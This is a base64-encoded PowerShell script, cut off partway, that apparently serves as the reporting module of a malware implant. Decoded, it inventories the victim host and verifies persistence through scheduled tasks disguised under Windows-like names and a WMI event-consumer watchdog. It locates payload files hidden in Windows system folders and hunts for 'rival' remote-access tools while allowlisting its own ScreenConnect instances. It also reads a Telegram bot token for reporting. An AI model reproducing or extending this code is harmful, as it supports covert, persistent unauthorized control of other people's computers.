IHsKICAgICRvID0gW29yZGVyZWRdQHsKICAgICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24g
PSAnbi9hJzsgQnVpbGQgPSAnbi9hJzsgQXJjaCA9ICduL2EnCiAgICAgICAgRG9tYWluID0gJ24v
YSc7IEluc3RhbGxEYXRlID0gJ24vYSc7IExhc3RCb290ID0gJ24vYScKICAgICAgICBDUFUgPSAn
bi9hJzsgTWFudWZhY3R1cmVyID0gJ24vYSc7IE1vZGVsID0gJ24vYSc7IFNlcmlhbCA9ICduL2En
CiAgICAgICAgVG90YWxSQU1fR0IgPSAnbi9hJzsgRGlza0ZyZWVfR0IgPSAnbi9hJzsgRGlza1Np
emVfR0IgPSAnbi9hJwogICAgfQogICAgdHJ5IHsKICAgICAgICAkb3MgPSBHZXQtQ2ltSW5zdGFu
Y2UgV2luMzJfT3BlcmF0aW5nU3lzdGVtCiAgICAgICAgJG8uQ2FwdGlvbiA9ICRvcy5DYXB0aW9u
CiAgICAgICAgJG8uVmVyc2lvbiA9ICRvcy5WZXJzaW9uCiAgICAgICAgJG8uQnVpbGQgPSAkb3Mu
QnVpbGROdW1iZXIKICAgICAgICAkby5BcmNoID0gJG9zLk9TQXJjaGl0ZWN0dXJlCiAgICAgICAg
JG8uSW5zdGFsbERhdGUgPSAoJG9zLkluc3RhbGxEYXRlIHwgR2V0LURhdGUgLUZvcm1hdCAneXl5
eS1NTS1kZCcpCiAgICAgICAgJG8uTGFzdEJvb3QgPSAoJG9zLkxhc3RCb290VXBUaW1lIHwgR2V0
LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbScpCiAgICAgICAgJG8uVG90YWxSQU1fR0Ig
PSBbbWF0aF06OlJvdW5kKCRvcy5Ub3RhbFZpc2libGVNZW1vcnlTaXplIC8gMU1CLCAxKQogICAg
fSBjYXRjaCB7fQogICAgdHJ5IHsKICAgICAgICAkY3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJf
Q29tcHV0ZXJTeXN0ZW0KICAgICAgICAkby5Eb21haW4gPSBpZiAoJGNzLlBhcnRPZkRvbWFpbikg
eyAkY3MuRG9tYWluIH0gZWxzZSB7ICRjcy5Xb3JrZ3JvdXAgfQogICAgICAgICRvLk1hbnVmYWN0
dXJlciA9ICRjcy5NYW51ZmFjdHVyZXIKICAgICAgICAkby5Nb2RlbCA9ICRjcy5Nb2RlbAogICAg
fSBjYXRjaCB7fQogICAgdHJ5IHsKICAgICAgICAkby5DUFUgPSAoR2V0LUNpbUluc3RhbmNlIFdp
bjMyX1Byb2Nlc3NvciB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IE5h
bWUpCiAgICB9IGNhdGNoIHt9CiAgICB0cnkgewogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2lt
SW5zdGFuY2UgV2luMzJfQklPUykuU2VyaWFsTnVtYmVyCiAgICB9IGNhdGNoIHt9CiAgICB0cnkg
ewogICAgICAgICRkID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0xvZ2ljYWxEaXNrIC1GaWx0ZXIg
IkRldmljZUlEPSdDOiciCiAgICAgICAgJG8uRGlza0ZyZWVfR0IgPSBbbWF0aF06OlJvdW5kKCRk
LkZyZWVTcGFjZSAvIDFHQiwgMSkKICAgICAgICAkby5EaXNrU2l6ZV9HQiA9IFttYXRoXTo6Um91
bmQoJGQuU2l6ZSAvIDFHQiwgMSkKICAgIH0gY2F0Y2gge30KICAgIHJldHVybiAkbwp9CgpmdW5j
dGlvbiBHZXQtU3ZjTGluZShbc3RyaW5nXSRuYW1lKSB7CiAgICAkcyA9IEdldC1TZXJ2aWNlIC1O
YW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoLW5vdCAkcykg
eyByZXR1cm4gJ05PVCBJTlNUQUxMRUQnIH0KICAgIHJldHVybiAoJ3swfSAoU3RhcnQ9ezF9KScg
LWYgJHMuU3RhdHVzLCAkcy5TdGFydFR5cGUpCn0KCmZ1bmN0aW9uIEdldC1UYXNrSGVhbHRoKFtz
dHJpbmddJHRuKSB7CiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZP
IExJU1QgL1YgMj4kbnVsbAogICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDAgLW9yIC1ub3QgJG91
dCkgewogICAgICAgIHJldHVybiBAeyBQcmVzZW50ID0gJGZhbHNlOyBTdGF0dXMgPSAnTUlTU0lO
Ryc7IE5leHQgPSAnJzsgTGFzdCA9ICcnOyBSZXN1bHQgPSAnJzsgT3VycyA9ICRmYWxzZSB9CiAg
ICB9CiAgICAkbWFwID0gQHt9CiAgICAkYmxvYiA9ICgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAi
JF8iIH0pIC1qb2luICJgbiIKICAgIGZvcmVhY2ggKCRsaW5lIGluICRvdXQpIHsKICAgICAgICBp
ZiAoJGxpbmUgLW1hdGNoICdeXHMqKFteOl0rKTpccyooLiopXHMqJCcpIHsKICAgICAgICAgICAg
JG1hcFskbWF0Y2hlc1sxXS5UcmltKCldID0gJG1hdGNoZXNbMl0uVHJpbSgpCiAgICAgICAgfQog
ICAgfQogICAgJHN0YXR1cyA9ICRtYXBbJ1N0YXR1cyddCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7
ICRzdGF0dXMgPSAkbWFwWydUYXNrIFN0YXR1cyddIH0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsg
JHN0YXR1cyA9ICdwcmVzZW50JyB9CiAgICAkbmV4dCA9ICRtYXBbJ05leHQgUnVuIFRpbWUnXQog
ICAgaWYgKC1ub3QgJG5leHQpIHsgJG5leHQgPSAnJyB9CiAgICAkbGFzdCA9ICRtYXBbJ0xhc3Qg
UnVuIFRpbWUnXQogICAgaWYgKC1ub3QgJGxhc3QpIHsgJGxhc3QgPSAnJyB9CiAgICAkcmVzdWx0
ID0gJG1hcFsnTGFzdCBSZXN1bHQnXQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAkcmVzdWx0ID0g
JycgfQogICAgJHRyID0gJG1hcFsnVGFzayBUbyBSdW4nXQogICAgaWYgKC1ub3QgJHRyKSB7ICR0
ciA9ICRtYXBbJ1Rhc2sgdG8gUnVuJ10gfQogICAgJG91cnMgPSAoJGJsb2IgLW1hdGNoICcoP2kp
b3duX21vblwuY21kfGV0bF9tb25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQogICAg
IyBQcmVzZW50IFdpbmRvd3MgYnVpbHQtaW4gd2l0aCBzYW1lIG5hbWUgaXMgTk9UIGhlYWx0aHkg
Zm9yIHVzCiAgICAkaGVhbHRoeSA9ICRvdXJzIC1hbmQgKCgkc3RhdHVzIC1tYXRjaCAnUmVhZHl8
UnVubmluZycpIC1vciAoJHN0YXR1cyAtZXEgJ3ByZXNlbnQnKSkKICAgIHJldHVybiBAewogICAg
ICAgIFByZXNlbnQgPSAkdHJ1ZQogICAgICAgIE91cnMgICAgPSBbYm9vbF0kb3VycwogICAgICAg
IEhlYWx0aHkgPSBbYm9vbF0kaGVhbHRoeQogICAgICAgIFN0YXR1cyAgPSAkKGlmICgkb3Vycykg
eyAkc3RhdHVzIH0gZWxzZSB7ICdOT1RfT1VSUycgfSkKICAgICAgICBOZXh0ICAgID0gJG5leHQK
ICAgICAgICBMYXN0ICAgID0gJGxhc3QKICAgICAgICBSZXN1bHQgID0gJHJlc3VsdAogICAgICAg
IFRyICAgICAgPSAkKGlmICgkdHIpIHsgJHRyIH0gZWxzZSB7ICcnIH0pCiAgICB9Cn0KCmZ1bmN0
aW9uIEdldC1SbW1IaXRzIHsKICAgICMgRGV0ZWN0IHJpdmFscyBmb3IgVGVsZWdyYW0uIEtFRVA6
IFNjcmVlbkNvbm5lY3QgYWxsb3dsaXN0ICsgRGF0dG8vQ2VudHJhU3RhZ2UuCiAgICAkdG9rZW5z
ID0gQCgKICAgICAgICAnQW55RGVzaycsICdUZWFtVmlld2VyJywgJ3R2bnNlcnZlcicsICdEV0Fn
ZW50JywgJ0RXU2VydmljZScsICdMb2dNZUluJywgJ0xNSUd1YXJkaWFuJywKICAgICAgICAnV2lu
Vk5DJywgJ3ZuY3NlcnZlcicsICd0dl8nLCAnU3BsYXNodG9wJywgJ1pvaG8gQXNzaXN0JywgJ1J1
c3REZXNrJywgJ1JlbW90ZVBDJywgJ0RhbWVXYXJlJywKICAgICAgICAnQXRlcmFBZ2VudCcsICdB
dGVyYScsICdOaW5qYVJNTScsICdOaW5qYU9uZScsICdOaW5qYVJNTUFnZW50JywgJ0thc2V5YScs
ICdBZ2VudE1vbicsICdQdWxzZXdheScsICdQQyBNb25pdG9yJywgJ1N5bmNybycsICdLYWJ1dG8n
LAogICAgICAgICdTdXBlck9wcycsICdNYW5hZ2VFbmdpbmUnLCAnVUVNUycsICdEZXNrdG9wIENl
bnRyYWwnLCAnRW5kcG9pbnQgQ2VudHJhbCcsICdTb2xhcldpbmRzIE1TUCcsICdDb25uZWN0V2lz
ZSBBdXRvbWF0ZScsICdMVFNlcnZpY2UnLCAnTGFiVGVjaCcsCiAgICAgICAgJ0FjdGlvbjEnLCAn
U2ltcGxlSGVscCcsICdCb21nYXInLCAnQmV5b25kVHJ1c3QnLCAnTWVzaEFnZW50JywgJ01lc2gg
Q2VudHJhbCcsICdNZXNoIEFnZW50JywKICAgICAgICAnVGFjdGljYWxSTU0nLCAndGFjdGljYWxy
bW0nLCAnR2V0U2NyZWVuJywgJ1N1cHJlbW8nLCAncnV0c2VydicsICdyZW1vdGluZ19ob3N0JywK
ICAgICAgICAnQ2hyb21lIFJlbW90ZSBEZXNrdG9wJywgJ1BhcnNlYycsICdOZXRTdXBwb3J0Jywg
J0xldmVsLmlvJywgJ0xldmVsIEFnZW50JywKICAgICAgICAnQ29udGludXVtJywgJ1NBQVonLCAn
TmF2ZXJpc2snLCAnSW1teUJvdCcsICdBdXRvbW94JywgJ2FtYWdlbnQnLCAnQWNyb25pcyBDeWJl
cicsICdEb21vdHonLCAnQXV2aWsnLAogICAgICAgICdCYXJyYWN1ZGEgUk1NJywgJ01hbmFnZWQg
V29ya3BsYWNlJywgJ0dvdmVybGFuJywgJ1BEUSBEZXBsb3knLCAnUERRIEludmVudG9yeScsICdQ
RFEgQ29ubmVjdCcsCiAgICAgICAgJ04tYWJsZScsICdOLWNlbnRyYWwnLCAnTi1zaWdodCcsICdU
YWtlIENvbnRyb2wnLCAnQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudCcsICdVbHRyYVZpZXdlcics
ICdBZXJvQWRtaW4nLAogICAgICAgICdMaXRlTWFuYWdlcicsICdSYWRtaW4nLCAnTm9NYWNoaW5l
JywgJ0lwZXJpdXMnLCAnSVNMIExpZ2h0JywgJ0FtbXl5JywgJ1RpZ2h0Vk5DJywgJ1VsdHJhVk5D
JywgJ1JlYWxWTkMnCiAgICApCiAgICAka2VlcFRva2VucyA9IEAoJ0RhdHRvJywgJ0NlbnRyYVN0
YWdlJywgJ0NhZ1NlcnZpY2UnLCAnQXV0b3Rhc2tFbmRwb2ludCcpCiAgICAkaGl0cyA9IE5ldy1P
YmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICAkc2VlbiA9
IEB7fQoKICAgIGZ1bmN0aW9uIEFkZC1IaXQoW3N0cmluZ10ka2luZCwgW3N0cmluZ10kbmFtZSkg
ewogICAgICAgICRrZXkgPSAiJGtpbmR8JG5hbWUiLlRvTG93ZXJJbnZhcmlhbnQoKQogICAgICAg
IGlmICgkc2Vlbi5Db250YWluc0tleSgka2V5KSkgeyByZXR1cm4gfQogICAgICAgICRzZWVuWyRr
ZXldID0gJHRydWUKICAgICAgICBbdm9pZF0kaGl0cy5BZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwv
Y29kZT4nIC1mICRraW5kLCAoRXNjICRuYW1lKSkpCiAgICB9CiAgICBmdW5jdGlvbiBUZXN0LUtl
ZXBOYW1lKFtzdHJpbmddJHMpIHsKICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNl
IH0KICAgICAgICBpZiAoJHMgLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0dXJuICR0cnVl
IH0KICAgICAgICBmb3JlYWNoICgkayBpbiAka2VlcFRva2VucykgeyBpZiAoJHMgLWxpa2UgIiok
ayoiKSB7IHJldHVybiAkdHJ1ZSB9IH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAg
R2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVj
dCB7CiAgICAgICAgJG4gPSAkXy5OYW1lCiAgICAgICAgJGQgPSAkXy5EaXNwbGF5TmFtZQogICAg
ICAgIGlmIChUZXN0LUtlZXBOYW1lICRuIC1vciBUZXN0LUtlZXBOYW1lICRkKSB7CiAgICAgICAg
ICAgIGlmICgkbiAtbGlrZSAnKkNlbnRyYVN0YWdlKicgLW9yICRkIC1saWtlICcqRGF0dG8qJyAt
b3IgJG4gLWxpa2UgJypDYWdTZXJ2aWNlKicpIHsKICAgICAgICAgICAgICAgIEFkZC1IaXQgJ2tl
ZXAtZGF0dG8nICgiJG4gKCQoJF8uU3RhdHVzKSkiKQogICAgICAgICAgICB9CiAgICAgICAgICAg
IHJldHVybgogICAgICAgIH0KICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9rZW5zKSB7CiAgICAg
ICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIgLW9yICRkIC1saWtlICIqJHQqIikgewogICAgICAg
ICAgICAgICAgQWRkLUhpdCAnc3ZjJyAoIiRuICgkKCRfLlN0YXR1cykpIikKICAgICAgICAgICAg
ICAgIGJyZWFrCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgR2V0LVByb2Nlc3Mg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAg
JG4gPSAkXy5Qcm9jZXNzTmFtZQogICAgICAgIGlmIChUZXN0LUtlZXBOYW1lICRuKSB7IHJldHVy
biB9CiAgICAgICAgZm9yZWFjaCAoJHQgaW4gJHRva2VucykgewogICAgICAgICAgICBpZiAoJG4g
LWxpa2UgIiokdCoiKSB7CiAgICAgICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbgogICAgICAg
ICAgICAgICAgYnJlYWsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICAkdW5pbnN0
ID0gQCgKICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZl
cnNpb25cVW5pbnN0YWxsXConLAogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxN
aWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicKICAgICkKICAgIGZv
cmVhY2ggKCRwYXRoIGluICR1bmluc3QpIHsKICAgICAgICBHZXQtSXRlbVByb3BlcnR5ICRwYXRo
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAg
ICAgICAkZG4gPSAkXy5EaXNwbGF5TmFtZQogICAgICAgICAgICBpZiAoLW5vdCAkZG4pIHsgcmV0
dXJuIH0KICAgICAgICAgICAgaWYgKFRlc3QtS2VlcE5hbWUgJGRuKSB7CiAgICAgICAgICAgICAg
ICBpZiAoJGRuIC1saWtlICcqRGF0dG8qJyAtb3IgJGRuIC1saWtlICcqQ2VudHJhU3RhZ2UqJykg
eyBBZGQtSGl0ICdrZWVwLWRhdHRvJyAkZG4gfQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAg
ICAgICAgIH0KICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAnU2NyZWVuQ29ubmVjdConKSB7IHJl
dHVybiB9CiAgICAgICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsKICAgICAgICAgICAg
ICAgIGlmICgkZG4gLWxpa2UgIiokdCoiKSB7CiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAn
bXNpJyAkZG4KICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQogICAg
ICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIHJldHVybiAkaGl0cwp9CgpmdW5jdGlvbiBH
ZXQtR3J5eGFLZWVwRnAgewogICAgJGZwID0gJzk5MDgxOThlNjY4ZTQ3NTAnCiAgICAkcCA9ICdD
OlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZVxncnl4YS5j
ZmcnCiAgICBpZiAoJFdvcmtEaXIpIHsgJHAgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhLmNm
ZycgfQogICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHApIHsKICAgICAgICBHZXQtQ29u
dGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JF
YWNoLU9iamVjdCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ15DVVJSRU5UX0ZQPShbMC05
YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0KICAgICAg
ICB9CiAgICB9CiAgICByZXR1cm4gJGZwCn0KCmZ1bmN0aW9uIEdldC1TY0luc3RhbGxzIHsKICAg
ICRncnl4YUZwID0gR2V0LUdyeXhhS2VlcEZwCiAgICAkbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVt
LkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICBHZXQtU2VydmljZSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1Nj
cmVlbkNvbm5lY3QgQ2xpZW50KicgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAkZnAgPSBp
ZiAoJF8uTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsgJG1hdGNoZXNbMV0gfSBl
bHNlIHsgJz8nIH0KICAgICAgICAkdGFnID0gaWYgKCRmcCAtZXEgJzVmNjAxMDU3OTg1MmU1MDcn
KSB7ICdLRUVQLVNFVlJaJyB9CiAgICAgICAgZWxzZWlmICgkZnAgLWVxICdmODYxYzgxNDBkNDUz
NDI3JykgeyAnS0VFUC1BTFQnIH0KICAgICAgICBlbHNlaWYgKCRmcCAtZXEgJGdyeXhhRnApIHsg
J0tFRVAtR1JZWEEnIH0KICAgICAgICBlbHNlIHsgJ0ZPUkVJR04nIH0KICAgICAgICBbdm9pZF0k
bGlzdC5BZGQoKCctIDxjb2RlPnswfTwvY29kZT46IDxiPnsxfTwvYj4gW3syfV0nIC1mIChFc2Mg
JF8uTmFtZSksIChFc2MgKFtzdHJpbmddJF8uU3RhdHVzKSksICR0YWcpKQogICAgfQoKICAgICRy
b290cyA9IEAoCiAgICAgICAgIiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGll
bnQqIiwKICAgICAgICAiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xp
ZW50KiIKICAgICkKICAgIGZvcmVhY2ggKCRwYXQgaW4gJHJvb3RzKSB7CiAgICAgICAgR2V0LUNo
aWxkSXRlbSAtUGF0aCAkcGF0IC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gcGF0
aDogPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAkXy5GdWxsTmFtZSkpKQogICAgICAgIH0KICAg
IH0KCiAgICAkdW5pbnN0ID0gQCgKICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdp
bmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXConLAogICAgICAgICdIS0xNOlxTT0ZUV0FS
RVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxc
KicKICAgICkKICAgIGZvcmVhY2ggKCRwYXRoIGluICR1bmluc3QpIHsKICAgICAgICBHZXQtSXRl
bVByb3BlcnR5ICRwYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2Jq
ZWN0IHsKICAgICAgICAgICAgJF8uRGlzcGxheU5hbWUgLWxpa2UgJypTY3JlZW5Db25uZWN0KicK
ICAgICAgICB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkdmVyID0gaWYgKCRfLkRp
c3BsYXlWZXJzaW9uKSB7ICRfLkRpc3BsYXlWZXJzaW9uIH0gZWxzZSB7ICc/JyB9CiAgICAgICAg
ICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gbXNpOiA8Y29kZT57MH08L2NvZGU+IHZ7MX0nIC1mIChF
c2MgJF8uRGlzcGxheU5hbWUpLCAoRXNjICR2ZXIpKSkKICAgICAgICB9CiAgICB9CgogICAgaWYg
KCRsaXN0LkNvdW50IC1lcSAwKSB7IFt2b2lkXSRsaXN0LkFkZCgnLSAobm9uZSknKSB9CiAgICBy
ZXR1cm4gJGxpc3QKfQoKJGNmZyA9IEdldC1DZmcKaWYgKC1ub3QgJGNmZy5CT1RfVE9LRU4gLW9y
IC1ub3QgJGNmZy5DSEFUX0lEKSB7CiAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4t
UGF0aCAkV29ya0RpciAnYm9vdC5lcnInKSAtVmFsdWUgJ3RnX3NraXBfbm9fY2ZnJyAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgZXhpdCAyCn0KCiRwcmltID0gJ1NjcmVlbkNvbm5l
Y3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJlNTA3KScKJGFsdCA9ICdTY3JlZW5Db25uZWN0IENsaWVu
dCAoZjg2MWM4MTQwZDQ1MzQyNyknCiRvcyA9IEdldC1Pc0luZm8KJHdobyA9IFtTZWN1cml0eS5Q
cmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUKJGVsZXYgPSAoW1Nl
Y3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsXVtTZWN1cml0eS5QcmluY2lwYWwuV2lu
ZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZSgKICAgIFtTZWN1cml0eS5Qcmlu
Y2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikKJGlzU3lzdGVtID0gJHdo
byAtbGlrZSAnKlNZU1RFTSonIC1vciAkd2hvIC1lcSAnTlQgQVVUSE9SSVRZXFNZU1RFTScKCiRt
c2lDYWNoZSA9IEpvaW4tUGF0aCAkV29ya0RpciAncGtnLm1zaScKJG1zaVNpemUgPSBpZiAoVGVz
dC1QYXRoICRtc2lDYWNoZSkgewogICAgJ3swOk4wfSBLQicgLWYgKChHZXQtSXRlbSAkbXNpQ2Fj
aGUgLUZvcmNlKS5MZW5ndGggLyAxS0IpCn0gZWxzZSB7ICdub25lJyB9CgokbW9uUGF0aCA9IEpv
aW4tUGF0aCAkV29ya0RpciAnb3duX21vbi5jbWQnCiRldGxNb24gPSAiJGVudjpQcm9ncmFtRGF0
YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZVxldGxfbW9uLmNtZCIKJGhhc01v
biA9IFRlc3QtUGF0aCAkbW9uUGF0aAokaGFzRXRsID0gVGVzdC1QYXRoICRldGxNb24KCiMgVDEw
OiBvbi1kaXNrIHBheWxvYWQgYnVpbGQgbWFya2VycyAtPiBldmVyeSByZXBvcnQgcHJvdmVzIGV4
YWN0bHkgd2hhdCBpcyBpbnN0YWxsZWQKZnVuY3Rpb24gR2V0LVBheWxvYWRCdWlsZChbc3RyaW5n
XSRmaWxlKSB7CiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRmaWxlKSkgeyByZXR1cm4gJ21pc3Np
bmcnIH0KICAgIGZvcmVhY2ggKCRsIGluIChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGZpbGUg
LVRvdGFsQ291bnQgOCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAg
ICAgICAgaWYgKCRsIC1tYXRjaCAnQlVJTERccytcZHs4fShbQS1aXStcZCspJykgeyByZXR1cm4g
JG1hdGNoZXNbMV0gfQogICAgfQogICAgcmV0dXJuICc/Jwp9CiRiTW9uID0gR2V0LVBheWxvYWRC
dWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcpCiRiU2VjID0gR2V0LVBheWxv
YWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fc2VjdXJlLmNtZCcpCiRiVGdyID0gR2V0
LVBheWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICd0Z19yZXBvcnQucHMxJykKJGJMaWIg
PSBHZXQtUGF5bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9saWIucHMxJykKCiMg
cGVyLWhvc3QgaWRlbnRpdHk6IGV4cGVjdGVkIHRhc2sgbmFtZXMgY29tZSBmcm9tIGlkZW50aXR5
LmNmZyB3aGVuIHByZXNlbnQKJGlkQ2ZnID0gSm9pbi1QYXRoICRXb3JrRGlyICdpZGVudGl0eS5j
ZmcnCiRpZE1hcCA9IEB7fQppZiAoVGVzdC1QYXRoICRpZENmZykgewogICAgR2V0LUNvbnRlbnQg
LUxpdGVyYWxQYXRoICRpZENmZyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICBpZiAoJF8gLW1h
dGNoICdeXHMqKFtBLVpfXSspXHMqPVxzKiguKz8pXHMqJCcpIHsgJGlkTWFwWyRtYXRjaGVzWzFd
XSA9ICRtYXRjaGVzWzJdIH0KICAgIH0KfQokZXhwZWN0ZWRUYXNrcyA9IEAoCiAgICBAeyBOYW1l
ID0gJChpZiAoJGlkTWFwLlRBU0tfQSkgeyAkaWRNYXAuVEFTS19BIH0gZWxzZSB7ICdXZXJRdWV1
ZVN5bmMnIH0pOyBSb2xlID0gInRpY2sgJCgkaWRNYXAuTU9fQSltIChjaGFpbjEpIiB9LAogICAg
QHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0IpIHsgJGlkTWFwLlRBU0tfQiB9IGVsc2UgeyAn
UGxhU2VydmVySGVhbHRoJyB9KTsgUm9sZSA9ICJiYWNrdXAgJCgkaWRNYXAuTU9fQiltIChjaGFp
bjEpIiB9LAogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0MpIHsgJGlkTWFwLlRBU0tf
QyB9IGVsc2UgeyAnV2RpSG9zdFByb3h5JyB9KTsgUm9sZSA9ICdPTlNUQVJUIChjaGFpbjEpJyB9
LAogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0QpIHsgJGlkTWFwLlRBU0tfRCB9IGVs
c2UgeyAnVGNwSXBDb25mbGljdFJlcycgfSk7IFJvbGUgPSAnT05MT0dPTiAoY2hhaW4xKScgfQop
CiMgY2hhaW4gMjogV01JIHdhdGNoZG9nIHN1YnNjcmlwdGlvbgokd21pQyA9IEdldC1XbWlPYmpl
Y3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENv
bnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIiAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZQokZXhwZWN0ZWRUYXNrcyArPSBAeyBOYW1lID0gJ1xXTUlcV3VjYWNoZVdh
dGNoZG9nQyc7IFJvbGUgPSAndGltZXIgM20gKGNoYWluMiknOyBXbWkgPSAoJG51bGwgLW5lICR3
bWlDKSB9CgokdGFza0xpbmVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJp
Yy5MaXN0W3N0cmluZ10KJHRhc2tPayA9IDAKJHRhc2tCYWQgPSAwCmZvcmVhY2ggKCR0IGluICRl
eHBlY3RlZFRhc2tzKSB7CiAgICBpZiAoJHQuQ29udGFpbnNLZXkoJ1dtaScpKSB7CiAgICAgICAg
aWYgKCR0LldtaSkgeyAkdGFza09rKys7ICRtYXJrID0gJ09LJyB9IGVsc2UgeyAkdGFza0JhZCsr
OyAkbWFyayA9ICdNSVNTSU5HJyB9CiAgICAgICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7
MH1dIDxjb2RlPnsxfTwvY29kZT4gLSB7Mn0nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNj
ICR0LlJvbGUpKSkKICAgICAgICBjb250aW51ZQogICAgfQogICAgJGggPSBHZXQtVGFza0hlYWx0
